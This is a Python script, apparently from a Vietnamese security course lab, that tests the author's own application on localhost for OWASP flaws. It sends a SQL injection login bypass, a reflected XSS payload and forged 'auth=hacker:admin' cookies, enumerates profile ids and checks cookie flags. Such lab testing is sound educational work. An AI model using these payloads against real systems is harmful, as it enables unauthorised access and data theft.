#!/usr/bin/env python3
"""
Lab 9 - Script đánh giá ATTT cho ứng dụng mục tiêu (CHỈ localhost:9090 của chính mình).
Mô phỏng các bước mà Burp Suite / OWASP ZAP dùng để kiểm thử thủ công.
Chạy:  python assess.py
"""
import requests, re

BASE = "http://localhost:9090"
results = []

def log(vuln, severity, status, detail):
    results.append((vuln, severity, status, detail))
    print(f"[{status}] {severity:<8} {vuln}\n        {detail}\n")

# 1) SQL Injection trên /login
r = requests.post(f"{BASE}/login", data={"username": "' OR '1'='1' --", "password": "x"}, timeout=5)
if "thành công" in r.text.lower():
    log("SQL Injection (A03)", "CAO", "DÍNH", "Payload \"' OR '1'='1' --\" đăng nhập được mà không cần mật khẩu.")
else:
    log("SQL Injection (A03)", "CAO", "an toàn", "Không bypass được.")

# 2) Reflected XSS trên /search
payload = "<script>alert('XSS')</script>"
r = requests.get(f"{BASE}/search", params={"q": payload}, timeout=5)
if payload in r.text:  # phản chiếu nguyên văn, không mã hoá
    log("Reflected XSS (A03)", "CAO", "DÍNH", "Tham số q được phản chiếu nguyên văn, chưa mã hoá -> script thực thi.")
else:
    log("Reflected XSS (A03)", "CAO", "an toàn", "Dữ liệu đã được mã hoá.")

# 3) Broken Authentication / Session - cookie vai trò giả mạo được
s = requests.Session()
# không đăng nhập, tự đặt cookie auth=admin
r = s.get(f"{BASE}/admin", cookies={"auth": "hacker:admin"}, timeout=5)
if "thành công" in r.text.lower():
    log("Broken Auth / Session (A07)", "CAO", "DÍNH",
        "Cookie 'auth' không ký, chỉ cần đặt auth=hacker:admin là chiếm quyền admin.")
else:
    log("Broken Auth / Session (A07)", "CAO", "an toàn", "Cookie được bảo vệ.")

# 4) Broken Access Control - /admin truy cập được bằng cookie giả
r = s.get(f"{BASE}/admin", cookies={"auth": "x:admin"}, timeout=5)
if "ADMIN" in r.text and "email" in r.text:
    log("Broken Access Control (A01)", "CAO", "DÍNH",
        "Trang /admin lộ danh sách toàn bộ user (kể cả email) mà không xác thực thật.")
else:
    log("Broken Access Control (A01)", "CAO", "an toàn", "Kiểm soát truy cập ổn.")

# 5) IDOR - đổi id xem hồ sơ người khác
leaked = []
for i in (1, 2, 3):
    row = requests.get(f"{BASE}/api/profile", params={"id": i}, timeout=5).json()
    if row:
        leaked.append(f"id={i}:{row.get('username')}/{row.get('role')}")
if len(leaked) > 1:
    log("IDOR (A01)", "TRUNG BÌNH", "DÍNH",
        "/api/profile?id= không kiểm tra quyền -> đọc hồ sơ bất kỳ: " + ", ".join(leaked))

# 6) Cookie thiếu cờ bảo mật
r = requests.post(f"{BASE}/login", data={"username": "user1", "password": "Pass123"}, timeout=5)
sc = r.headers.get("Set-Cookie", "")
flags = []
if "HttpOnly" not in sc: flags.append("thiếu HttpOnly")
if "Secure" not in sc: flags.append("thiếu Secure")
if "SameSite" not in sc: flags.append("thiếu SameSite")
if flags:
    log("Cookie thiếu cờ bảo mật (A05)", "TRUNG BÌNH", "DÍNH",
        "Set-Cookie: " + ", ".join(flags) + " -> JS đọc được cookie, dễ bị đánh cắp.")

print("="*60)
print(f"TỔNG: phát hiện {sum(1 for x in results if x[2]=='DÍNH')} lỗ hổng.")
